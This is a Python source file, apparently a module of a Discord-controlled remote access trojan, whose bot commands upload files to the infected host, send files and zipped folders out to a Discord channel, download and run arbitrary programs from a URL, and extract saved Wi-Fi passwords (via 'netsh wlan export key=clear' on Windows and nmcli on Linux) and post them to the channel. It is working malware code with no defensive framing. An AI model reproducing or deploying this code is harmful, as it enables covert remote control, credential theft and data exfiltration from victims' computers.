"""
commands/files.py - file management and remote execution commands.
"""

import glob
import os
import shutil
import subprocess
import tempfile

import aiofiles
import aiohttp
import discord
from discord.ext import commands

from config import IS_WINDOWS, bot
from utils import (
    chunk_string,
    in_correct_channel,
    is_authorized,
    log_message,
    send_temporary_message,
    wrong_channel,
)


class FileCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.check(is_authorized)
    async def file_upload(self, ctx, *target_path_parts):
        target_path = " ".join(target_path_parts)
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            if ctx.message.attachments:
                for attachment in ctx.message.attachments:
                    async with aiofiles.open(target_path, "wb") as f:
                        await f.write(await attachment.read())
                await working.delete()
                await log_message(ctx, "File(s) successfully uploaded.")
            else:
                await working.delete()
                await log_message(ctx, "No files found to upload.")
        except Exception as e:
            await working.delete()
            await log_message(ctx, f"Error uploading file: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def file_download(self, ctx, *file_path_parts):
        file_path = " ".join(file_path_parts)
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            if not os.path.exists(file_path):
                await log_message(ctx, "File not found.")
                await working.delete()
                return

            with tempfile.TemporaryDirectory() as tmp:
                if os.path.isdir(file_path):
                    zip_base = os.path.join(tmp, os.path.basename(file_path))
                    shutil.make_archive(zip_base, "zip", file_path)
                    file_path = zip_base + ".zip"

                file_size = os.path.getsize(file_path)
                if file_size <= 8 * 1024 * 1024:
                    await ctx.send(file=discord.File(file_path))
                else:
                    await send_temporary_message(
                        ctx, "File is too large to be sent directly.", duration=10
                    )
                    part = 1
                    with open(file_path, "rb") as f:
                        while chunk := f.read(8 * 1024 * 1024):
                            part_path = os.path.join(
                                tmp, f"{os.path.basename(file_path)}_part{part}"
                            )
                            with open(part_path, "wb") as pf:
                                pf.write(chunk)
                            await ctx.send(file=discord.File(part_path))
                            part += 1

            await log_message(ctx, "File successfully downloaded.")
            await working.delete()
        except Exception as e:
            await working.delete()
            await log_message(ctx, f"Error downloading file: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def execute(self, ctx, url: str):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            filename = url.split("/")[-1]
            dest = os.path.join(tempfile.gettempdir(), filename)
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        async with aiofiles.open(dest, mode="wb") as f:
                            await f.write(await resp.read())
                        kwargs = {"shell": True}
                        if IS_WINDOWS:
                            kwargs["creationflags"] = subprocess.CREATE_NEW_CONSOLE
                        subprocess.Popen(dest, **kwargs)
                        await working.delete()
                        await log_message(
                            ctx,
                            f"{filename} was downloaded and started in a new process.",
                        )
                    else:
                        await working.delete()
                        await log_message(
                            ctx, f"Error downloading file: HTTP {resp.status}"
                        )
        except Exception as e:
            await working.delete()
            await log_message(ctx, f"Error downloading and executing file: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def wifi(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            if IS_WINDOWS:
                export_dir = os.path.join(tempfile.gettempdir(), "WifiExport")
                os.makedirs(export_dir, exist_ok=True)
                subprocess.run(
                    [
                        "netsh",
                        "wlan",
                        "export",
                        "profile",
                        "key=clear",
                        f"folder={export_dir}",
                    ],
                    check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                xml_files = glob.glob(os.path.join(export_dir, "*.xml"))
                if not xml_files:
                    await working.delete()
                    await send_temporary_message(
                        ctx, "No exported WLAN profiles found.", duration=10
                    )
                    return
                for xml_file in xml_files:
                    with open(xml_file, "rb") as f:
                        await ctx.send(
                            file=discord.File(f, filename=os.path.basename(xml_file))
                        )
                await working.delete()
                await send_temporary_message(
                    ctx, "WLAN profiles successfully exported and sent.", duration=10
                )
            else:
                result = subprocess.run(
                    ["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"],
                    capture_output=True,
                    text=True,
                )
                lines = [
                    l for l in result.stdout.strip().splitlines() if "wireless" in l
                ]
                output = ""
                for line in lines:
                    name = line.split(":")[0]
                    pw = subprocess.run(
                        [
                            "nmcli",
                            "-s",
                            "-g",
                            "802-11-wireless-security.psk",
                            "connection",
                            "show",
                            name,
                        ],
                        capture_output=True,
                        text=True,
                    )
                    output += f"SSID: {name} | Password: {pw.stdout.strip() or '(none / open)'}\n"
                await working.delete()
                if output:
                    for chunk in chunk_string(output, 1900):
                        await ctx.send(f"```\n{chunk}\n```")
                else:
                    await send_temporary_message(
                        ctx, "No WiFi profiles found.", duration=10
                    )
        except Exception as e:
            await working.delete()
            await send_temporary_message(
                ctx, f"Error retrieving WiFi profiles: {e}", duration=10
            )


async def setup(bot):
    await bot.add_cog(FileCommands(bot))
